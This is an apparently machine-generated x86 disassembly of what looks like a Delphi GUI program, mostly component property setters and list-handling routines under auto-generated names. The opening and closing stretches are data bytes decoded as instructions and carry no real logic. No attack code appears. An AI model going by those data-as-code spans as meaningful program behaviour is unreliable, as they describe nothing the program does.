add [ eax - 0x40 ] ch
inc ecx
add ah al
rol [ ecx ] 0x98
rol [ ecx ] 0x88
mov edx 0xc1d40041
inc ecx
add [ eax - 0x3e ] cl
inc ecx
add [ eax + 0x6d ] ah
inc ebp
add [ eax - 0x44 ] bh
inc ecx
add [ edi + ebp * 4 ] ah
inc ecx
add [ edi * 4 - 0x42abffbf ] dl
inc ecx
add al al
mov ebp 0xb3740041
inc ecx
add [ eax - 0x41 ] dl
inc ecx
add [ ebp + esi * 4 + 0x41 ] bh
add [ eax - 0x4a ] dl
inc ecx
add [ edi + edi * 4 - 0x4063ffbf ] cl
inc ecx
add [ esi + esi * 4 - 0x48f7ffbf ] dh
inc ecx
add [ edi + esi * 4 - 0x46b3ffbf ] dh
inc ecx
add [ ecx + edi * 4 - 0x45c7ffbf ] ah
inc ecx
add ah bl
mov esp 0xbcf80041
inc ecx
add al dh
mov edi 0xbe400041
inc ecx
add [ eax ] al
retn 0x41
inc ecx
add al dh
mov esi 0xbef40041
inc ecx
add al cl
mov bl 0x41
popad
je r-xdata
inc ecx
add ah dh
mov esi 0xb3c80041
inc ecx
lea eax [ eax ]
inc esp
pop ebp
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
pop ebp
inc ebp
sub_455dd8
adc dl al
inc ecx
add [ 0x6f685354 ] cl
jb r-xdata
add [ eax ] cl
xor al [ eax ]
cmp al 0x67
inc ebx
jne r-xdata
inc ebp
add [ edi + 0x33c0045 ] cl
inc edx
add al cl
stosd [ edi ]
inc ecx
add [ esp + eax ] dl
inc eax
add [ edi ] bh
dec esp
imul esi [ ebx + 0x74 ] 0x5df0c08b
inc ebp
add [ edi ] al
or eax 0x6f685354
jb r-xdata
inc edx
adc al 0x4
inc ebx
jne r-xdata
add [ eax + 0x9 ] dh
inc edx
add [ eax + 0x45 ] bl
add [ eax + 0x6c ] bl
inc ebp
add [ edi + eax + 0x42 ] cl
add [ esp + eax ] dh
inc edx
add [ esp + eax ] ch
inc edx
add [ edi + eax + 0x42 ] dl
add al ch
inc bp
add [ eax ] dh
or al [ edx ]
aam 0x9
inc edx
add [ eax + 0x9 ] ch
inc edx
add [ eax + 0x6c004209 ] bl
or [ edx ] eax
mov al 0x61
inc ebp
add [ eax + 0x1800456a ] al
push 0x45
add [ ebp + ebp * 2 + 0x45 ] dl
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ecx + edx ] al
inc eax
add [ eax + eax ] ah
add [ ecx + edx ] al
inc eax
add [ eax ] bh
add [ eax ] al
add al 0x11
inc eax
add [ eax + eax ] bh
add [ edx ] al
add dh ch
dec esp
imul esi [ ebx + 0x74 ] r-xdata
je r-xdata
push esp
mov ebp 0xbdc00041
inc ecx
add [ ebx + esi * 4 + 0x41 ] dh
add [ eax - 0x41 ] dl
inc ecx
add [ ebp + esi * 4 + 0x41 ] bh
add [ eax - 0x4a ] dl
inc ecx
add [ edi + edi * 4 - 0x4063ffbf ] cl
inc ecx
add [ esi + esi * 4 - 0x48f7ffbf ] dh
inc ecx
add [ edi + esi * 4 - 0x46b3ffbf ] dh
inc ecx
add [ ecx + edi * 4 - 0x45c7ffbf ] ah
inc ecx
add ah bl
mov esp 0xbcf80041
inc ecx
add al dh
mov edi 0xbe400041
inc ecx
add [ eax ] al
retn 0x41
inc ecx
add [ eax ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x5e600000
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebx * 2 + 0x5ef80045 ] dh
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh dl
pop esi
inc ebp
add ah ah
pop esi
inc ebp
add [ eax - 0x2c000000 ] ah
pop eax
inc ebp
add [ edi + eax ] dh
inc edx
add [ eax - 0x77ffbfcc ] ch
add [ edx ] al
mov al 0x34
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
sub_455fec
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420910
test bl bl
jle r-xdata
mov edx esi
call sub_456400
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_45605c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_420424
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebx
call sub_456104
sub_456090
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_456020
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x5c ]
mov edi [ edx + 0x30 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_41a4c0
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x30 ]
mov ecx ebx
mov edx esi
call sub_41a64c
sub_4560d8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x58 ]
call sub_4043b0
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x58 ]
mov edx esi
call sub_403ff8
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x30 ]
sub_456104
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x5c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_456400
mov edx ebx
mov eax esi
call sub_4563e0
sub_45612c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_456104
sub_456158
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_46bfe8
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff3
call sub_403450
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_42099c
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb040
call sub_446ea0
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4561b0
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_46c010
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff0
call sub_403450
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_4209b8
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb03f
call sub_446ea0
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_456208
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41ffc4
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ ebx + 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_45638c
mov [ ebx + 0x58 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_456274
push ebx
push esi
push edi
call sub_4035e0
mov ebx edx
mov edi eax
mov eax [ edi + 0x34 ]
call sub_403254
jmp r-xdata
mov esi [ edi + 0x30 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_41a6b8
call sub_403254
mov eax [ edi + 0x30 ]
call sub_403254
mov edx ebx
and dl 0xfc
mov eax edi
call sub_420010
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035c8
sub_4562c4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_45630c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_41a62c
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403404
mov edx edi
call sub_456090
sub_456358
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x38 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x34 ]
call sub_4580b4
pop esi
pop ebx
retn
mov edx [ ebx + 0x34 ]
call sub_4580f8
mov edx ebx
mov eax [ ebx + 0x38 ]
call sub_420094
sub_456398
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_4202e0
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x38 ]
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax esi
call sub_456400
sub_4563e0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_41a474
mov [ esi + 0x5c ] ebx
mov edx ebx
mov eax esi
call sub_420094
pop esi
pop ebx
retn
sub_456400
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_41a714
test eax eax
jl r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x5c ] eax
sub_45641c
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
test [ ebx + 0x1c ] 0x10
je r-xdata
inc esi
xor edi edi
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
dec esi
jne r-xdata
cmp [ esi + 0x250 ] 0x0
je r-xdata
mov eax [ esi + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_456484
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esi + 0x8 ]
call sub_461cd0
mov ebx eax
mov ax [ esi + 0x4 ]
mov edx ebx
call sub_459950
mov ebp eax
test bp bp
je r-xdata
xor eax eax
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp bp [ ebx + 0x84 ]
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + edi * 4 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
jmp r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_456d2c
mov edx ebp
call sub_456d8c
inc eax
je r-xdata
sub_456510
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x4a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_456530
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x52 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_456550
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x58 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x1 ] al
mov al [ esp ]
mov [ ebx + 0x58 ] al
cmp al 0x1
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
inc esi
xor ebp ebp
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
test edi edi
je r-xdata
dec al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
cmp [ esp + 0x1 ] 0x2
jne r-xdata
test edi edi
je r-xdata
jmp r-xdata
inc ebp
dec esi
jne r-xdata
mov dl [ edi + 0x94 ]
mov eax edi
call sub_4569a0
cmp [ esp ] 0x2
jne r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov edi [ eax + ebp * 4 ]
mov al [ esp ]
sub al 0x1
jb r-xdata
mov al [ edi + 0x6a ]
mov [ edi + 0x94 ] al
mov dl 0x1
mov eax edi
call sub_4569a0
sub_4566e8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4208cc
mov [ esi + 0x6a ] 0x1
mov [ esi + 0x80 ] 0xffffffff
mov [ esi + 0x86 ] 0x1
xor eax eax
mov [ esi + 0x90 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_45673c
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov eax [ esi + 0x98 ]
call sub_403254
mov eax [ esi + 0x9c ]
call sub_403254
cmp [ esi + 0x90 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_455fec
test bl bl
jle r-xdata
lea eax [ esi + 0x90 ]
call sub_40d788
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_45678c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41acac
mov edx [ ebx + 0x64 ]
mov edi esi
mov eax edi
call sub_456838
mov dl [ ebx + 0x69 ]
mov eax edi
call sub_456898
mov dl [ ebx + 0x6a ]
mov eax edi
call sub_4569a0
mov edx [ ebx + 0x74 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x7c ]
mov eax edi
call sub_456ad8
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_456b38
mov dx [ ebx + 0x84 ]
mov eax edi
call sub_456b94
mov dl [ ebx + 0x86 ]
mov eax edi
call sub_456bf8
push [ ebx + 0x44 ]
push [ ebx + 0x40 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax [ ebx + 0x48 ]
mov [ edi + 0x48 ] eax
mov eax [ ebx + 0x4c ]
mov [ edi + 0x4c ] eax
mov eax [ ebx + 0x38 ]
mov [ edi + 0x38 ] eax
mov eax [ ebx + 0x3c ]
mov [ edi + 0x3c ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_456838
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x64 ]
call sub_4043b0
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x64 ]
mov edx [ esp ]
call sub_403ff8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403404
test eax eax
je r-xdata
sub_456898
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x68 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x1
xor edx edx
push ebp
push sub_456990
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x69 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x69 ] bl
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jle r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x69 ] 0x0
je r-xdata
inc esi
dec edi
jne r-xdata
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
call sub_456350
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_403404
test eax eax
je r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx esi
call sub_45633c
mov ebx eax
cmp ebx [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx + 0x6c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x6c ]
jne r-xdata
xor edx edx
mov eax ebx
call sub_456898
sub_4569a0
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x6a ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov dl [ eax + 0x58 ]
cmp dl 0x1
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
cmp dl 0x2
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
jmp r-xdata
inc edi
dec esi
jne r-xdata
mov dl [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ esp ] 0x1
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403404
test eax eax
je r-xdata
sub_456a18
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax ebp
mov edx [ ebx + 0x78 ]
call sub_4043b0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
lea eax [ ebx + 0x78 ]
mov edx ebp
call sub_403ff8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_41a5d0
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_41a5d0
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
sub_456a80
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x74 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x74 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403404
test eax eax
je r-xdata
sub_456ad8
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x7c ]
call sub_4043b0
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x7c ]
mov edx [ esp ]
call sub_403ff8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403404
test eax eax
je r-xdata
sub_456b38
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x80 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x80 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403404
test eax eax
je r-xdata
sub_456b94
push ebx
push esi
push edi
push ecx
mov [ esp ] dx
mov ebx eax
mov ax [ esp ]
cmp ax [ ebx + 0x84 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov ax [ esp ]
mov [ ebx + 0x84 ] ax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov dx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403404
test eax eax
je r-xdata
sub_456bf8
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x86 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebp + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebp + 0x86 ] bl
mov eax ebp
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_41a5d0
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ ebp + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_403404
test eax eax
je r-xdata
sub_456c58
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x64 ]
call sub_4043b0
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov ebx eax
mov edx edi
mov eax esi
call sub_42051c
test bl bl
je r-xdata
mov al 0x1
test [ ebx + 0x1c ] 0x1
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_456838
sub_456ca4
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x8a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_456ccc
push ebx
mov ebx eax
xor eax eax
mov edx [ ebx + 0x5c ]
test edx edx
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x44 ]
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ edx + 0x58 ] 0x0
jne r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x95 ] 0x0
je r-xdata
pop ebx
retn
xor eax eax
jmp r-xdata
mov eax ebx
call sub_456158
test al al
jne r-xdata
cmp [ ebx + 0x69 ] 0x0
je r-xdata
mov al 0x1
mov dl [ ebx + 0x69 ]
xor dl 0x1
mov eax ebx
call sub_456898
cmp [ ebx + 0x69 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
sub_456d60
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41bc6c
mov edi eax
mov eax esi
call sub_459c3c
movzx ecx ax
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_456d8c
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp bp ax
jne r-xdata
sub_456dd0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_456df5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456dfc
retn
sub_456e7e
inc ebp
add [ ebx ] cl
push esp
inc ebx
push 0x65676e61
dec esp
imul ebp [ esi + 0x6b ] r-xdata
add ecx [ 0x61724454 ]
ja r-xdata
insd
popad
push es
outsb
push ebx
je r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
mov eax eax
jl r-xdata
popad
dec ecx
outsb
js r-xdata
inc ebp
add [ ecx ] al
or edx [ ecx + ecx * 2 + 0x6d ]
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ esi + ebp * 2 + 0x64070045 ] cl
jae r-xdata
add al 0x42
inc ebp
imul esi [ ebp + ecx * 2 + 0x61 ] 0x49076b73
insd
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add [ ebx ] ecx
push esp
dec ecx
insd
add [ eax ] al
add al ah
outsb
inc ebp
add [ edi ] al
imul esi [ ecx + ecx * 2 + 0x6d ] 0x6656761
outsd
arpl [ ebp + 0x73 ] si
or ah [ ebx + esi * 2 + 0x53 ]
insb
arpl [ gs : ebp + 0x64 ] si
or [ ebx + esi * 2 + 0x4e ] ah
outsd
jb r-xdata
add [ fs : ebp ] 0x10
push esp
inc ebx
jne r-xdata
add [ edi + eax + 0x42 ] dl
add [ eax + 0x70 ] cl
inc ebp
add [ eax + 0x7a ] cl
inc ebp
add [ ecx + esi * 2 + 0x45 ] dl
add [ eax - 0x79 ] dl
inc ebp
add ah bl
xchg [ ebp ] eax
push esp
add [ ebp ] 0x1
add bh ch
jmp [ eax + eax * 4 + 0x45 ]
add [ edx + eax * 4 + 0x7e540045 ] bl
inc ebp
add [ esp + eax ] dl
inc edx
add al ah
add al [ edx ]
and al 0x4
inc edx
add [ eax + 0x74c0042 ] bl
inc edx
add [ esp + eax ] dh
inc edx
add [ esp + eax ] ch
inc edx
add [ eax ] al
